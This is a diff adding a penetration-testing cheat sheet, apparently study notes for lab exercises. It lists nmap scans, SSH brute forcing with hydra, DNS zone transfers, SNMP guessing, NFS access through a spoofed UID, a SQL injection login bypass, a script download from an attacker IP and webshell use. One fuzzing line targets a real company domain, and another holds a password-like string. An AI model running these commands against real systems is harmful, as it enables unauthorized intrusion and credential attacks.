@@ -1,0 +1,106 @@
+===Full TCP nmap====
+nmap -sSVC -A $IP -o nmap_scan.txt
+nmap -sV -sC -p- -o nmap.out -vvv $IP
+
+====UDP nmap======
+nmap -sU --top-ports 20 -o nmap-udp.out -vvv $RHOST
+
+======ssh bruteforce===
+hydra -l $USERNAME -P /usr/share/wordlists/wfuzz/others/common_pass.txt ssh:$IP
+
+
+=====SMTP (25/tcp)===
+nc $ip 25
+
+
+====DNS (53/tcp)=====
+dig axfr @$RHOST DOMAIN.COM
+or
+dnsrecon -d DOMAIN.COM
+
+
+=======RPC / NFS (111/tcp)=======
+	Enumerate RPC first:
+nmap -sV -p 111 --script=rpcinfo $RHOST
+
+      NFS-related services, enum
+nmap -p 111 --script nfs* $RHOST
+
+
+============================================================================================================
+If you find NFS shares, mount them and see if you can read/write files 
+or change your permissions by adding a new user with a certain UID. 
+If you can’t seem to do anything, remember the fact that it is there for later.
+
+mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt
+groupadd --gid 1337 pwn
+useradd --uid 1337 -g pwn pwn
+==================================================================
+
+
+======SNMP (161/udp)=========
+sudo nmap -sU -sV -sC --open -p 161 $RHOST
+===================================
+
+=====various tools for dumping database=====
+snmp-check $RHOST
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $RHOST
+snmpwalk -v1 -c public $RHOS
+=======================================================
+
+=======mysql==============
+mysql -u Oscp12345!-h 192.168.184.139 -p Oscp12345!
+
+python /usr/share/john/ssh2john.py id_rsa > hash
+
+
+wget http://192.168.184.129:8081/suid.py
+
+
+
+==============port 80============
+gobuster dir -u http://192.168.184.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html -o gobuster.out
+gobuster vhost -u http://192.168.184.139 -w common-vhosts.txt
+nikto -h $RHOST -o nikto-out.txt
+wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/small.txt http://forwardslash.htb/FUZZ
+wfuzz -c --hc 404,400 -w /usr/share/wordlists/wfuzz/general/common.txt -H 'HOST:FUZZ.forwardslash.htb' -u http://10.10.10.183
+wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt -b 'PHPSESSID=7a7sm38m39412sdld' -u http://backup.forwardslash.htb/FUZZ.php
+wfuzz --sc 200,500 -w /usr/share/wordlists/dirb/big.txt -u https://assets.nerdwallet.com/FUZZ
+
+=========SSLScan vulnerabilities (Heartbleed) on SSL-enabled services.================
+sslscan $RHOST
+
+===========sql-injection=====
+fuzzing random symbols (mainly ')
+admin:' OR '1'='1
+===============================
+
+
+===============for web shell====================================================
+In these instances, it’s a valuable skill to be able to effectively 
+identify the web technology and have a webshell at hand that you can try (try Kali’s /usr/share/webshells
+=============================================================================
+
+
+================check file system or user===========
+whoami /all
+id 
+uname -an
+lsb_release -n
+tree /f /a
+=================
+
+winPEAS.exe
+
+
+
+
+
+============GRET RESOURCES THAT CAN BE USE========
+https://github.com/s0wr0b1ndef/
+=================================================
+
+
+
+
+
